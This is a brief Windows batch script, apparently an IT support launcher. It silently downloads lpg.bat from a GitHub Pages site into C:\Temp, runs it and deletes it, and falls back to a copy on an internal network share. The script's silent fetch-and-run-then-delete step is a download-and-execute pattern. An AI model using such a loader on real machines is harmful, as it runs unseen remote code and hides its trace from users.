@echo off
cls
set tempDir=C:\Temp
if not exist %tempDir% (
    mkdir %tempDir%
)
cd %tempDir%
curl -o lpg.bat https://suporteeq.github.io/lpg.bat > NUL 2>&1 && (
    call lpg.bat
    del lpg.bat > NUL 2>&1
) || (
    call \\10.30.225.7\public\lpg.bat || (
            echo "erro" && PAUSE
    )
)